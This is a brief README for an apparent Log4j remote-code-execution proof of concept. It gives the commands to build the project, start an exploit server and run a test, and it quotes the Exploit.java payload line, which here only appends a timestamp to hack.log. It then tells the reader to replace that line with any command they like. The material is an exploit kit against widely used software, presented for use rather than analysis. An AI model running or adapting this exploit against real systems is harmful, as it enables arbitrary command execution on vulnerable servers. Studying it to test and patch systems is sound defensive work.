## Build: `./build.sh`

## Start log4j RCE Server: `./start-log4j-rce-server.sh`

## Test
`java -cp log4j-rce-1.0-SNAPSHOT-all.jar log4j`
Check if you get logs in hack.log from current folder

You can change this line 
`String[] cmds = { "sh", "-c", "echo 'Exploit at '" + getDateString() + " >> ./hack.log" };`
in file apache-log4j-poc/src/main/java/Exploit.java
to whatever command you like then rebuild
